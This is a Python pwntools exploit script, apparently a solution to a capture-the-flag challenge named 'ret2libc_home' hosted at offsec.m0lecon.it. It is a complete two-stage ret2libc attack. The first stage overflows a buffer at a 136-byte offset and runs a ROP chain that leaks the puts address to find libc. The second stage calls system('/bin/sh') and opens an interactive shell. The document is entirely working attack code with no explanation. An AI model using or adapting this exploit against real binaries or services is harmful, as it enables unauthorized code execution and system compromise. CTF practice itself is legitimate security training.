#!/usr/bin/env python3
from pwn import *

exe = ELF('./ret2libc_home', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote('offsec.m0lecon.it', 13523)

r = conn()

OFFSET_TO_RIP = 136
POP_RDI = exe.symbols['pop_rdi_ret']

rop = ROP(exe)
RET = rop.find_gadget(['ret'])[0]

r.recvuntil(b"message:\n")

stage1 = flat(
    b"A" * OFFSET_TO_RIP,
    p64(POP_RDI),
    p64(exe.got['puts']),
    p64(exe.plt['puts']),
    p64(exe.symbols['main'])
)

r.send(stage1)
r.recvuntil(b"sent!\n")

leak = r.recvline().strip()
puts_leak = u64(leak.ljust(8, b"\x00"))
libc.address = puts_leak - libc.symbols['puts']

log.success(f"Leaked puts address: {hex(puts_leak)}")
log.success(f"Resolved Libc Base: {hex(libc.address)}")

r.recvuntil(b"message:\n")

binsh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols['system']

stage2 = flat(
    b"A" * OFFSET_TO_RIP,
    p64(RET),
    p64(POP_RDI),
    p64(binsh),
    p64(system)
)

r.send(stage2)
r.interactive()